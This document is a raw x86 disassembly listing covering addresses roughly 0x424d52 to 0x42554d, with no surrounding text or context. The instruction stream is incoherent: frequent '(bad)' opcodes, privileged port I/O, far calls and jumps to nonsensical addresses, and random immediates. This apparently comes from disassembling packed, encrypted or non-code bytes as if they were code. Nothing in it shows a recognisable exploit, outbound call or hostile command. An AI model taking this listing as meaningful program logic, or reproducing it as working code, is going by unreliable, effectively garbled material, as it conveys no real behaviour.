  424d52:	fstp   TBYTE PTR [esi+0x30]
  424d55:	in     al,0x87
  424d57:	xchg   edi,eax
  424d58:	jnp    0x424d60
  424d5a:	call   DWORD PTR [ebp+0x3]
  424d5d:	mov    bl,0xe6
  424d5f:	jg     0x424ddb
  424d61:	aas    
  424d62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424d63:	ret    0xae26
  424d66:	add    ebp,DWORD PTR [edi-0x380214ff]
  424d6c:	pop    edi
  424d6d:	test   al,0x76
  424d6f:	dec    ebx
  424d70:	daa    
  424d71:	int3   
  424d72:	clc    
  424d73:	and    BYTE PTR [eax-0x6bcf0e9e],ah
  424d79:	mov    ds:0xf304e97a,eax
  424d7e:	mov    dl,0xa6
  424d80:	push   0xffffff9b
  424d82:	sub    eax,0xf3ec6954
  424d87:	inc    edi
  424d88:	repnz lock cdq 
  424d8b:	jmp    0xd45412f2
  424d90:	ficomp WORD PTR [eax]
  424d92:	sub    DWORD PTR [ecx+ebp*4-0x23f1779b],edi
  424d99:	retf   0x164d
  424d9c:	add    DWORD PTR [ecx-0x71],ebx
  424d9f:	ins    DWORD PTR es:[edi],dx
  424da0:	push   0x97ea7c7e
  424da5:	mov    ch,BYTE PTR [ebx+esi*4]
  424da8:	mov    ebx,0xf893d440
  424dad:	cs pushf 
  424daf:	mov    bl,0x80
  424db1:	outs   dx,BYTE PTR ds:[esi]
  424db2:	mov    edx,0x487e3869
  424db7:	xchg   edx,eax
  424db8:	out    0xe3,eax
  424dba:	jp     0x424d45
  424dbc:	mov    ch,0xc
  424dbe:	dec    edx
  424dbf:	out    dx,al
  424dc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424dc1:	arpl   WORD PTR [eax-0x7654bbd7],bp
  424dc7:	or     DWORD PTR [ebx+eiz*2+0x2e87da96],ecx
  424dce:	call   0x951b:0x6c3e2991
  424dd5:	call   0x5be56435
  424dda:	aad    0xc2
  424ddc:	jg     0x424dfe
  424dde:	sbb    al,0x7a
  424de0:	idiv   DWORD PTR [edx-0x40]
  424de3:	scas   eax,DWORD PTR es:[edi]
  424de4:	lea    edi,[eax]
  424de6:	push   edx
  424de7:	or     al,0x52
  424de9:	add    BYTE PTR [esi+0x6f],dh
  424dec:	ror    BYTE PTR [ecx+0x54092a49],cl
  424df2:	clc    
  424df3:	push   ss
  424df4:	sub    dl,BYTE PTR [ebx]
  424df6:	or     eax,0x4061b945
  424dfb:	and    eax,0xec9c708f
  424e00:	mov    al,0x56
  424e02:	xor    ah,BYTE PTR [edx+0x5e]
  424e05:	push   es
  424e06:	imul   BYTE PTR [eax]
  424e08:	xor    BYTE PTR [ebx+0x59],ch
  424e0b:	popa   
  424e0c:	and    ch,BYTE PTR [ebp+0xb]
  424e0f:	dec    ebp
  424e10:	sahf   
  424e11:	jo     0x424db6
  424e13:	cld    
  424e14:	mov    al,0x28
  424e16:	jl     0x424df3
  424e18:	push   0x232902a6
  424e1d:	sbb    DWORD PTR [ebp-0x13a9060c],edi
  424e23:	push   ebp
  424e24:	adc    eax,ecx
  424e26:	(bad)
  424e29:	jmp    0x0:0xe7335184
	...
  424e38:	add    BYTE PTR [eax],al
  424e3a:	ins    BYTE PTR es:[edi],dx
  424e3b:	sub    ch,BYTE PTR [ebx]
  424e3d:	outs   dx,DWORD PTR es:[esi]
  424e3f:	daa    
  424e40:	ins    DWORD PTR es:[edi],dx
  424e41:	push   0xffffffda
  424e43:	add    BYTE PTR [ecx],0x9d
  424e46:	test   eax,0x80771def
  424e4b:	mov    BYTE PTR [ecx],0x0
  424e4e:	cld    
  424e4f:	add    DWORD PTR [eax],eax
  424e51:	add    BYTE PTR [ebx+0x2a3d73d2],cl
  424e57:	jp     0x424e0d
  424e59:	into   
  424e5a:	jne    0x424e76
  424e5c:	aad    0x5c
  424e5e:	into   
  424e5f:	into   
  424e60:	mov    al,bh
  424e62:	mov    dh,0xbd
  424e64:	ds jmp 0x424e8f
  424e67:	cmp    eax,0xa77134af
  424e6c:	pop    esi
  424e6d:	outs   dx,BYTE PTR ds:[esi]
  424e6e:	or     eax,edi
  424e70:	xor    BYTE PTR [edi+0x5c8d3ad],ah
  424e76:	pop    ss
  424e77:	adc    eax,0x8934210e
  424e7c:	(bad)  
  424e7d:	fcmovb st,st(0)
  424e7f:	test   BYTE PTR [eax+edi*4+0x5d00d200],ah
  424e86:	add    bl,BYTE PTR [edx-0x1e2d4dd]
  424e8c:	sbb    cl,BYTE PTR [esi+0x7ebfc98f]
  424e92:	outs   dx,BYTE PTR ds:[esi]
  424e93:	jne    0x424e1f
  424e95:	gs push esp
  424e97:	(bad)  
  424e98:	lds    esp,FWORD PTR [ebx]
  424e9a:	test   bh,0x90
  424e9d:	pop    esp
  424e9e:	and    ah,BYTE PTR [eax+0x5d]
  424ea1:	mov    eax,ds:0xfc59211f
  424ea6:	dec    edx
  424ea7:	mov    ch,0xc7
  424ea9:	adc    BYTE PTR [edx+0xb2d7975],al
  424eaf:	div    BYTE PTR [eax+0x60764f8a]
  424eb5:	add    eax,0xe7a7e16f
  424eba:	xor    DWORD PTR [eax+0xd],ebx
  424ebd:	jg     0x424eae
  424ebf:	or     al,0x3c
  424ec1:	shl    DWORD PTR gs:[ebx],1
  424ec4:	or     bh,BYTE PTR [esi+edx*8+0x57]
  424ec8:	mov    ebx,0x1cdd37a9
  424ecd:	aaa    
  424ece:	or     al,BYTE PTR gs:[ebp-0x2d79204d]
  424ed5:	xor    bh,BYTE PTR [edi+0x6d176cd0]
  424edb:	call   0xf19318b6
  424ee0:	sahf   
  424ee1:	jae    0x424f4c
  424ee3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424ee4:	and    ah,BYTE PTR [ebx+ebx*8-0x29e053d9]
  424eeb:	pop    ss
  424eec:	fiadd  DWORD PTR [esi]
  424eee:	cmp    al,0xe4
  424ef0:	jecxz  0x424e79
  424ef2:	nop
  424ef3:	test   al,0x92
  424ef5:	inc    eax
  424ef6:	(bad)  
  424ef7:	or     eax,0x7d148e95
  424efc:	popf   
  424efd:	aas    
  424efe:	(bad)  
  424eff:	fcmovbe st,st(1)
  424f01:	in     al,dx
  424f02:	cdq    
  424f03:	adc    al,0xf4
  424f05:	mov    ebp,0xa6aa3769
  424f0a:	cmp    BYTE PTR [ebp+0x60ef642f],cl
  424f10:	mov    eax,0xabccca13
  424f15:	(bad)  [edx+ebx*4]
  424f18:	adc    ebx,ebp
  424f1a:	arpl   sp,di
  424f1c:	out    dx,eax
  424f1d:	sar    DWORD PTR [ebp+0x75],0x4d
  424f21:	inc    esp
  424f22:	or     cl,BYTE PTR [edi+0x65f07067]
  424f28:	js     0x424f6c
  424f2a:	inc    esp
  424f2b:	ins    DWORD PTR es:[edi],dx
  424f2c:	in     al,dx
  424f2d:	addr16 stc 
  424f2f:	outs   dx,DWORD PTR ds:[esi]
  424f30:	mov    edi,0x9402a31d
  424f35:	mov    ah,0xea
  424f37:	adc    al,0x30
  424f39:	cli    
  424f3a:	xchg   edi,eax
  424f3b:	or     BYTE PTR [ebp+0x5a],bl
  424f3e:	adc    ecx,DWORD PTR [ebx+0x67d9e52a]
  424f44:	push   ecx
  424f45:	nop
  424f46:	and    eax,DWORD PTR [ecx]
  424f48:	pop    edx
  424f49:	cmp    al,dl
  424f4b:	ja     0x424f39
  424f4d:	jns    0x424fbd
  424f4f:	sub    BYTE PTR [eax+0x2a96c5b6],dh
  424f55:	mov    bh,0x26
  424f57:	hlt    
  424f58:	cmc    
  424f59:	xchg   ebp,eax
  424f5a:	xchg   esi,eax
  424f5b:	sar    DWORD PTR [ebx],0xde
  424f5e:	std    
  424f5f:	repnz stos DWORD PTR es:[edi],eax
  424f61:	xchg   edi,eax
  424f62:	pusha  
  424f63:	lods   al,BYTE PTR ds:[esi]
  424f64:	(bad)  
  424f65:	jns    0x424eea
  424f67:	repnz mov esp,0x3d089138
  424f6d:	rcr    DWORD PTR [ecx],1
  424f6f:	inc    edi
  424f70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424f71:	push   0x96ce38dd
  424f76:	cmp    DWORD PTR [ecx],esi
  424f78:	in     eax,0x1
  424f7a:	xchg   edx,eax
  424f7b:	call   0xc029a70
  424f80:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  424f82:	pop    ss
  424f83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424f84:	aas    
  424f85:	sub    DWORD PTR [edi+0x62],ecx
  424f88:	fs dec ebp
  424f8a:	xchg   ecx,eax
  424f8b:	pusha  
  424f8c:	pop    edx
  424f8d:	repnz imul edi,DWORD PTR [ebx-0x79],0xb24810ac
  424f95:	popa   
  424f96:	pop    ecx
  424f97:	repnz es out dx,eax
  424f9a:	shl    DWORD PTR [ecx],1
  424f9c:	(bad)  
  424f9d:	in     eax,dx
  424f9e:	stc    
  424f9f:	fwait
  424fa0:	bound  esi,QWORD PTR [esi-0x706181d2]
  424fa6:	adc    ah,ch
  424fa8:	xlat   BYTE PTR ds:[ebx]
  424fa9:	mov    ah,0xc8
  424fab:	lahf   
  424fac:	mov    BYTE PTR [esi],bh
  424fae:	mov    ds:0xe6fdc7df,eax
  424fb3:	repz jno 0x424f58
  424fb6:	test   BYTE PTR [edi],cl
  424fb8:	rcr    BYTE PTR [edx],0x37
  424fbb:	scas   al,BYTE PTR es:[edi]
  424fbc:	push   ecx
  424fbd:	xlat   BYTE PTR ds:[ebx]
  424fbe:	jae    0x424f5a
  424fc0:	ds mov bh,0x6f
  424fc3:	push   eax
  424fc4:	xor    DWORD PTR [edi+0x5b],eax
  424fc7:	aam    0xdd
  424fc9:	sbb    bh,BYTE PTR [edi+0x4aba1803]
  424fcf:	test   BYTE PTR [ebx+0x3c9e524],dh
  424fd5:	out    dx,eax
  424fd6:	mov    ebx,0x759d819a
  424fdb:	(bad)  [esi+0x14]
  424fde:	test   al,cl
  424fe0:	adc    eax,0x8f0c0c96
  424fe5:	call   DWORD PTR [ebx]
  424fe7:	leave  
  424fe8:	fidivr DWORD PTR [esi]
  424fea:	push   eax
  424feb:	pop    ebx
  424fec:	sub    al,0xcf
  424fee:	inc    edi
  424fef:	test   eax,0x87721dde
  424ff4:	xchg   ecx,eax
  424ff5:	ins    BYTE PTR es:[edi],dx
  424ff6:	inc    BYTE PTR [edi-0x77]
  424ff9:	les    esi,FWORD PTR [ebp+0x66]
  424ffc:	xor    esp,ebx
  424ffe:	mov    al,0xa
  425000:	and    al,0x26
  425002:	fisub  WORD PTR [ebx]
  425004:	push   edx
  425005:	jae    0x424fa7
  425007:	fild   QWORD PTR [ecx+0x74dddd33]
  42500d:	scas   al,BYTE PTR es:[edi]
  42500e:	jp     0x425027
  425010:	and    edx,DWORD PTR [edi-0x3d]
  425013:	pop    ebp
  425014:	test   eax,0x211a55e5
  425019:	push   ebp
  42501a:	xor    BYTE PTR [ecx+0x74],dl
  42501d:	ss sbb al,0xc8
  425020:	push   ds
  425021:	call   0x1024:0xd077ffc
  425028:	lods   eax,DWORD PTR ds:[esi]
  425029:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42502a:	ficom  WORD PTR [edx]
  42502c:	add    ch,BYTE PTR [edi-0x111451dd]
  425032:	mov    eax,ds:0x1ea0d5cd
  425037:	lahf   
  425038:	jle    0x424fd9
  42503a:	sbb    DWORD PTR [edi+ebx*1-0x2],esp
  42503e:	je     0x425042
  425040:	rcr    BYTE PTR [ebp+0x64],cl
  425043:	or     ebp,edx
  425045:	mov    dl,0x7f
  425047:	idiv   BYTE PTR [edi+0x63d023a9]
  42504d:	fiadd  DWORD PTR [eax]
	...
  425057:	add    BYTE PTR [eax],al
  425059:	add    BYTE PTR [ebx-0x73],al
  42505c:	pop    ds
  42505d:	and    bh,bl
  42505f:	mov    dl,0x7f
  425061:	out    dx,eax
  425062:	leave  
  425063:	enter  0xb54,0x31
  425067:	ror    DWORD PTR [edi],1
  425069:	sar    DWORD PTR [eax+ecx*8+0x1],cl
  42506d:	add    ah,bh
  42506f:	add    DWORD PTR [eax],eax
  425071:	add    BYTE PTR [ecx+0x373dbf55],dl
  425077:	scas   eax,DWORD PTR es:[edi]
  425078:	addr16 adc edx,ebx
  42507b:	stos   DWORD PTR es:[edi],eax
  42507c:	pop    ss
  42507d:	fwait
  42507e:	jnp    0x42502f
  425080:	mov    ecx,ecx
  425082:	das    
  425083:	(bad)  
  425084:	mov    BYTE PTR ds:0xbdc4e93d,al
  42508a:	inc    ecx
  42508b:	push   edi
  42508c:	sbb    dl,ah
  42508e:	jge    0x425043
  425090:	pop    edx
  425091:	xchg   ecx,eax
  425092:	xchg   edi,eax
  425093:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425094:	rcr    ebp,1
  425096:	repnz mov eax,ds:0x2e851c80
  42509c:	jns    0x425115
  42509e:	mov    esi,0x4a2fcf5b
  4250a3:	push   esi
  4250a4:	fcom   st(7)
  4250a6:	jmp    0x1ee1b7c7
  4250ab:	pop    es
  4250ac:	or     eax,0x4e046269
  4250b1:	pushf  
  4250b2:	enter  0x4196,0x3c
  4250b6:	hlt    
  4250b7:	test   eax,0x8160ec20
  4250bc:	and    al,0x3
  4250be:	arpl   WORD PTR [ecx],si
  4250c0:	mov    bl,0x5c
  4250c2:	(bad)  
  4250c3:	push   esi
  4250c4:	int    0xe3
  4250c6:	aaa    
  4250c7:	push   ss
  4250c8:	xchg   esi,eax
  4250c9:	leave  
  4250ca:	jmp    0x3523:0x31ac7a20
  4250d1:	mov    DWORD PTR [edx+0x75],eax
  4250d4:	sub    ch,bh
  4250d6:	push   es
  4250d7:	pop    es
  4250d8:	(bad)  
  4250db:	or     dh,BYTE PTR [edi]
  4250dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4250de:	pusha  
  4250df:	push   ebx
  4250e0:	nop
  4250e1:	repnz mov eax,DWORD PTR [edi-0x7d08cb69]
  4250e8:	sbb    esi,DWORD PTR [ebx]
  4250ea:	mov    eax,ds:0x2c7a347f
  4250f0:	inc    edx
  4250f1:	ds mov edi,0xeafa7328
  4250f7:	js     0x4250a7
  4250f9:	and    ebx,DWORD PTR [edx+ebp*1]
  4250fc:	cmp    BYTE PTR [edi],al
  4250fe:	jbe    0x425142
  425100:	adc    ebp,DWORD PTR [esi-0x23614701]
  425106:	fcmovnu st,st(2)
  425108:	sub    esp,0xe313ffd4
  42510e:	(bad)  
  42510f:	cmp    BYTE PTR [ebp-0x5e914a23],ah
  425115:	xor    cl,bl
  425117:	and    eax,0x999da896
  42511c:	cmp    DWORD PTR es:[esp+edi*8+0x1e44f4e8],ebx
  425124:	and    bh,bh
  425126:	push   ebx
  425127:	and    BYTE PTR [bp+di],dl
  42512a:	sub    ebx,DWORD PTR [ebp-0x5610f35]
  425130:	mov    WORD PTR [edx],?
  425132:	xlat   BYTE PTR ds:[ebx]
  425133:	loopne 0x425167
  425135:	mov    ah,dh
  425137:	jns    0x425147
  425139:	jne    0x4250e2
  42513b:	(bad)  
  42513c:	mov    al,0xd2
  42513e:	loop   0x4250f2
  425140:	xor    eax,0xc5a1382e
  425145:	dec    dx
  425147:	jnp    0x4250ff
  425149:	cmp    DWORD PTR [eax],esi
  42514b:	ss repz call 0xe35c48b0
  425152:	lahf   
  425153:	setg   BYTE PTR [ebx-0x2c]
  425157:	xor    eax,0xf9c1a223
  42515c:	xor    bl,BYTE PTR [esi]
  42515e:	or     ebp,edi
  425160:	fsub   QWORD PTR [ebp+0x37d62665]
  425166:	pop    es
  425167:	clc    
  425168:	or     eax,DWORD PTR [ebp-0x61]
  42516b:	bound  edi,QWORD PTR [ebx*4-0x315714e]
  425172:	jge    0x42518a
  425174:	push   ecx
  425175:	leave  
  425176:	scas   al,BYTE PTR es:[edi]
  425177:	sub    al,0xb5
  425179:	dec    eax
  42517a:	jmp    0x425146
  42517c:	sti    
  42517d:	cs pop es
  42517f:	xchg   DWORD PTR [ecx+0x3b363cdf],edx
  425185:	mov    eax,ds:0xc277056a
  42518a:	and    eax,0x21fcc7fe
  42518f:	jns    0x42514d
  425191:	stos   DWORD PTR es:[edi],eax
  425192:	inc    edx
  425193:	xor    bl,0x24
  425196:	mov    dh,0xc7
  425198:	inc    esi
  425199:	xchg   esp,eax
  42519a:	add    ebp,0x20586f65
  4251a0:	dec    edi
  4251a1:	bound  edx,QWORD PTR [edx]
  4251a3:	sbb    eax,0x78e1865b
  4251a8:	or     al,0x14
  4251aa:	outs   dx,BYTE PTR ds:[esi]
  4251ab:	jns    0x4251ca
  4251ad:	push   es
  4251ae:	jle    0x42520e
  4251b0:	cmp    bl,BYTE PTR [esi-0x14fb4b05]
  4251b6:	test   DWORD PTR [edi],esp
  4251b8:	addr16 inc edx
  4251ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4251bb:	push   ebx
  4251bc:	add    DWORD PTR [edi],0xef63d26b
  4251c2:	adc    DWORD PTR [edi+ebx*8+0x63],ebx
  4251c6:	in     al,dx
  4251c7:	inc    ebx
  4251c8:	xchg   edx,eax
  4251c9:	arpl   sp,ax
  4251cb:	sub    ebx,ebx
  4251cd:	outs   dx,DWORD PTR ds:[esi]
  4251ce:	dec    ecx
  4251cf:	mov    dl,0x9c
  4251d1:	outs   dx,BYTE PTR ds:[esi]
  4251d2:	mov    WORD PTR [edx+0x13],?
  4251d5:	enter  0x70a3,0xdb
  4251d9:	inc    ebp
  4251da:	mov    ch,0x62
  4251dc:	fcomp  QWORD PTR [edx+0x31]
  4251df:	inc    ebp
  4251e0:	into   
  4251e1:	add    DWORD PTR [ebp-0x2da9e002],ebp
  4251e7:	sub    eax,0xca180904
  4251ec:	sub    DWORD PTR [eax+0xdcc2e41],edx
  4251f2:	xchg   esp,eax
  4251f3:	add    esp,ebx
  4251f5:	iret   
  4251f6:	int    0xe7
  4251f8:	(bad)  [eax-0x4b74cf2]
  4251fe:	mov    cl,0x6b
  425200:	xchg   edx,eax
  425201:	inc    ebp
  425202:	sbb    edx,DWORD PTR [eax+edi*2-0x47]
  425206:	rcr    BYTE PTR [ebx+0x9],cl
  425209:	or     eax,0xf1aaf188
  42520e:	push   es
  42520f:	leave  
  425210:	xor    eax,0x66114763
  425215:	adc    al,0x73
  425217:	cmp    al,0x68
  425219:	popa   
  42521a:	sub    BYTE PTR [ebx],ch
  42521c:	lock imul eax,DWORD PTR [eax+0x5a],0xd1f77388
  425224:	pop    edx
  425225:	and    edx,esp
  425227:	ror    BYTE PTR [ecx+0x1ee3cd7e],0x2d
  42522e:	clc    
  42522f:	(bad)  
  425230:	jns    0x425288
  425232:	add    BYTE PTR [esi+0x566f0446],dh
  425238:	xor    al,0xaa
  42523a:	call   FWORD PTR [eax+edi*8+0x72]
  42523e:	test   BYTE PTR [edi],bl
  425240:	mov    dl,0x5d
  425242:	js     0x4252a1
  425244:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425245:	outs   dx,BYTE PTR ds:[esi]
  425246:	jp     0x425287
  425248:	fxsave [edi+0xcad380b]
  42524f:	push   esp
  425250:	loop   0x42527e
  425252:	test   BYTE PTR [ebp+0x49],cl
  425255:	sub    BYTE PTR [edi+0x51eebce6],bl
  42525b:	out    dx,al
  42525c:	test   eax,0x77d1172d
  425261:	jg     0x4251f4
  425263:	mov    esi,0xa3e54fa9
  425268:	adc    BYTE PTR [esi-0x58],bh
  42526b:	or     edi,DWORD PTR [eax-0xc]
	...
  42527a:	hlt    
  42527b:	cmp    DWORD PTR [edx-0x2002081],edx
  425281:	mov    ebx,0xd77f6470
  425286:	iret   
  425287:	jae    0x42521b
  425289:	int    0x78
  42528b:	retf   0x1
  42528e:	cld    
  42528f:	add    DWORD PTR [eax],eax
  425291:	add    cl,bh
  425293:	mov    ah,BYTE PTR [esp+edi*1+0x43]
  425297:	jae    0x42528a
  425299:	nop
  42529a:	inc    edx
  42529b:	movhps QWORD PTR [esi],xmm2
  42529e:	inc    eax
  42529f:	and    edi,DWORD PTR [ebp+0x6111d32e]
  4252a5:	adc    ah,BYTE PTR [esi+0x55]
  4252a8:	xchg   ebx,eax
  4252a9:	test   eax,0x7c28563a
  4252af:	test   DWORD PTR [esi+0x6c],esi
  4252b2:	xor    eax,0xee4c2374
  4252b7:	adc    esi,DWORD PTR [edi]
  4252b9:	jmp    esi
  4252bb:	ds into 
  4252bd:	lds    edx,FWORD PTR [ebx+0x4e712bde]
  4252c3:	and    ecx,DWORD PTR ss:[ecx-0x2e]
  4252c7:	jno    0x425270
  4252c9:	pop    esi
  4252ca:	test   DWORD PTR [edi],ebx
  4252cc:	add    DWORD PTR [edx],0x4f
  4252cf:	mov    edx,DWORD PTR [ebx+eax*4-0x66]
  4252d3:	nop
  4252d4:	test   al,0xe7
  4252d6:	in     eax,0x2e
  4252d8:	(bad)  
  4252d9:	into   
  4252da:	push   ebx
  4252db:	retf   0x7928
  4252de:	ins    BYTE PTR es:[edi],dx
  4252df:	(bad)  
  4252e0:	mov    al,ds:0xe079e30c
  4252e5:	loop   0x425288
  4252e7:	xchg   esi,eax
  4252e8:	enter  0xfaca,0x41
  4252ec:	test   al,0xb
  4252ee:	lahf   
  4252ef:	nop
  4252f0:	dec    ebp
  4252f1:	fiadd  DWORD PTR [ebx]
  4252f3:	cmp    BYTE PTR [eax-0x20c5d114],0x19
  4252fa:	pop    eax
  4252fb:	mov    cl,0x75
  4252fd:	adc    eax,0x99df993b
  425302:	and    ah,ch
  425304:	mov    edx,0xa764afdd
  425309:	push   0x645d7fe5
  42530e:	sbb    eax,0xadc24e05
  425313:	arpl   bx,bx
  425315:	mov    ch,BYTE PTR [ebp+0x28487ad4]
  42531b:	or     eax,0xb453436
  425320:	leave  
  425321:	aam    0x17
  425323:	pop    edx
  425324:	mov    dh,0xc8
  425326:	xor    eax,0x94c60c05
  42532b:	xchg   BYTE PTR [edi+0x22],bh
  42532e:	bound  ebp,QWORD PTR [ecx]
  425330:	adc    al,0xfb
  425332:	inc    eax
  425333:	call   0xd088bc2d
  425338:	out    0x48,al
  42533a:	mov    al,ds:0x3cd70acb
  42533f:	inc    edx
  425340:	imul   ecx,ebp,0xb1de820a
  425346:	(bad)  
  425347:	push   0x9a6c774c
  42534c:	mov    ebx,DWORD PTR [eax-0x3f]
  42534f:	dec    ebx
  425350:	dec    ecx
  425351:	and    esi,ebp
  425353:	in     al,dx
  425354:	cli    
  425355:	push   es
  425356:	aas    
  425357:	mov    ?,WORD PTR [ebx+ebp*4-0x3]
  42535b:	out    0x5f,al
  42535d:	pop    ecx
  42535e:	push   0xffffffb9
  425360:	push   0x79d8c3cc
  425365:	je     0x42536d
  425367:	sbb    al,0x2d
  425369:	and    al,0xda
  42536b:	cdq    
  42536c:	je     0x425367
  42536e:	pop    ds
  42536f:	pop    ebx
  425370:	pop    edx
  425371:	mov    WORD PTR [edx+0x42],ds
  425374:	cmc    
  425375:	adc    BYTE PTR [edi],dl
  425377:	or     ebp,esi
  425379:	hlt    
  42537a:	push   ss
  42537b:	bswap  edi
  42537d:	mov    bl,0xb9
  42537f:	popa   
  425380:	inc    edx
  425381:	fisttp DWORD PTR [ecx+0x683a681a]
  425387:	fst    DWORD PTR [ebx]
  425389:	pop    ebx
  42538a:	adc    bl,BYTE PTR [edx-0x6ae99977]
  425390:	mov    eax,0x73a31d37
  425395:	sahf   
  425396:	push   ebx
  425397:	pop    ebx
  425398:	pop    edi
  425399:	mov    ebx,0x46fb7c20
  42539e:	mov    ebp,DWORD PTR [ebx+0x53]
  4253a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4253a2:	stc    
  4253a3:	mov    ecx,DWORD PTR [ecx]
  4253a5:	mov    edx,0x45c553ff
  4253aa:	retf   0x42c0
  4253ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4253ae:	adc    al,0x70
  4253b0:	ins    BYTE PTR es:[edi],dx
  4253b1:	loopne 0x4253a0
  4253b3:	ret    0xa247
  4253b6:	pop    esi
  4253b7:	(bad)  
  4253b8:	mov    ebx,0x92747c7d
  4253bd:	jl     0x425354
  4253bf:	fmul   DWORD PTR ds:0x1f8f7fc7
  4253c5:	fsubr  DWORD PTR [ebp-0x548f7617]
  4253cb:	cli    
  4253cc:	mov    cs:0xc3566b3a,eax
  4253d2:	mov    eax,0xefb26296
  4253d7:	push   edx
  4253d8:	adc    eax,0xbdbf7271
  4253dd:	sti    
  4253de:	xor    BYTE PTR [ebx+0x6db7eeec],bh
  4253e4:	test   eax,0xae92cf9c
  4253e9:	(bad)  
  4253eb:	aad    0x19
  4253ed:	inc    di
  4253ef:	or     al,0x2e
  4253f2:	retf   
  4253f3:	mov    BYTE PTR [esi-0x53490995],dh
  4253f9:	loope  0x4253ca
  4253fb:	mov    bh,0x8a
  4253fd:	mov    ebp,0xf9ead0a5
  425402:	arpl   WORD PTR [edi-0x79bda18d],bp
  425408:	dec    edx
  425409:	fild   WORD PTR [ecx]
  42540b:	mov    dh,dh
  42540d:	add    BYTE PTR [ebx-0x19b82f32],bl
  425413:	cmp    al,0xd7
  425415:	or     DWORD PTR [edi+0x3cf7dbf0],esp
  42541b:	push   0x59
  42541d:	ins    DWORD PTR es:[edi],dx
  42541e:	pop    esp
  42541f:	push   eax
  425420:	aas    
  425421:	ret    0x255e
  425424:	add    al,0x3d
  425426:	gs stc 
  425428:	cli    
  425429:	mov    esp,0x6b06471c
  42542e:	jae    0x4254a8
  425430:	scas   eax,DWORD PTR es:[edi]
  425431:	sbb    eax,0xc8c65bf3
  425436:	movzx  ecx,ax
  425439:	fwait
  42543a:	dec    eax
  42543b:	and    eax,0x21b8c36c
  425440:	jne    0x4253f6
  425442:	dec    edi
  425443:	hlt    
  425444:	inc    ecx
  425445:	fdiv   QWORD PTR [ebx-0x12379229]
  42544b:	stc    
  42544c:	ss push ecx
  42544e:	out    0xe5,eax
  425450:	outs   dx,BYTE PTR ds:[esi]
  425451:	stos   DWORD PTR es:[edi],eax
  425452:	dec    ecx
  425453:	dec    ebx
  425454:	sbb    esi,DWORD PTR [ecx-0x55d56986]
  42545a:	outs   dx,BYTE PTR ds:[esi]
  42545b:	adc    BYTE PTR [esp+edx*4-0x3e],ch
  42545f:	lea    esp,[esi+0xb]
  425462:	sbb    eax,ebx
  425464:	or     al,0xee
  425466:	hlt    
  425467:	jno    0x4254c1
  425469:	and    dl,BYTE PTR [esi-0x15]
  42546c:	inc    ebp
  42546d:	and    al,0x77
  42546f:	addr16 and al,0xd4
  425473:	cwde   
  425474:	call   0xd1683cf2
  425479:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42547a:	xor    ecx,DWORD PTR [edx]
  42547c:	imul   ecx,DWORD PTR [edi],0xffffffed
  42547f:	pop    edi
  425480:	sbb    edx,DWORD PTR [ebx-0x6fe5de62]
  425486:	adc    al,0x7f
  425488:	mov    bl,0x80
  42548a:	and    bh,cl
  42548c:	mov    dl,0xb9
	...
  42549a:	push   esp
  42549b:	ds and al,0x19
  42549e:	outs   dx,BYTE PTR ds:[esi]
  42549f:	sbb    edi,DWORD PTR [ebp+0x7f]
  4254a2:	(bad)  
  4254a3:	aam    0x10
  4254a5:	dec    edi
  4254a6:	cmp    al,0xd7
  4254a8:	mov    eax,0x1cc74f6
  4254ad:	add    ah,bh
  4254af:	add    DWORD PTR [eax],eax
  4254b1:	add    BYTE PTR [ebp-0x74],cl
  4254b4:	and    al,0xfe
  4254b6:	push   0xea8519f4
  4254bb:	stos   BYTE PTR es:[edi],al
  4254bc:	add    DWORD PTR [ecx],ebp
  4254be:	into   
  4254bf:	jp     0x425453
  4254c1:	xchg   esi,eax
  4254c2:	pop    edx
  4254c3:	xchg   DWORD PTR [ebx+0x723761b3],edi
  4254c9:	cmp    edi,DWORD PTR [ebp-0x74af74bd]
  4254cf:	hlt    
  4254d0:	cdq    
  4254d1:	pop    esp
  4254d2:	fldcw  WORD PTR [ebp+0xeeae0e2]
  4254d8:	xchg   esp,ebp
  4254da:	mov    edi,0x785b987c
  4254df:	pop    ebx
  4254e0:	push   ss
  4254e1:	dec    ebx
  4254e2:	pop    ds
  4254e3:	outs   dx,BYTE PTR ds:[esi]
  4254e4:	sbb    eax,0x87ae99d2
  4254e9:	call   0x92d0:0x726c22f7
  4254f0:	adc    eax,0x6b03f212
  4254f5:	ficomp DWORD PTR [edi+0x5ec6729]
  4254fb:	cmp    BYTE PTR [ebx+0xcaa68bf],ah
  425501:	sbb    ebp,ebx
  425503:	mov    ebx,0xae4044c0
  425508:	ret    
  425509:	and    al,0x7c
  42550b:	sub    eax,0x7a5396b2
  425510:	xchg   ebp,eax
  425511:	loop   0x425541
  425513:	aas    
  425514:	or     eax,0x44c50319
  425519:	cmc    
  42551a:	sub    bh,bl
  42551c:	enter  0x431,0x91
  425520:	jge    0x4254e2
  425522:	pop    ecx
  425523:	aaa    
  425524:	dec    edi
  425525:	ins    BYTE PTR es:[edi],dx
  425526:	dec    eax
  425527:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425528:	dec    ebx
  425529:	xor    ecx,DWORD PTR [esi-0x58]
  42552c:	sub    DWORD PTR [ecx],ebp
  42552e:	hlt    
  42552f:	call   0x30368de5
  425534:	push   ebx
  425535:	stc    
  425536:	fst    QWORD PTR [ecx]
  425538:	outs   dx,DWORD PTR ds:[esi]
  425539:	ret    0xe8fc
  42553c:	sbb    DWORD PTR [ecx+eiz*8-0x29],esp
  425540:	xchg   esi,eax
  425541:	test   DWORD PTR [edx],esp
  425543:	pop    edx
  425544:	lds    esp,FWORD PTR [ecx]
  425546:	mov    eax,fs
  425548:	jmp    0x4255b7
  42554a:	pusha  
  42554b:	je     0x4255bd
  42554d:	ret    0x1a57
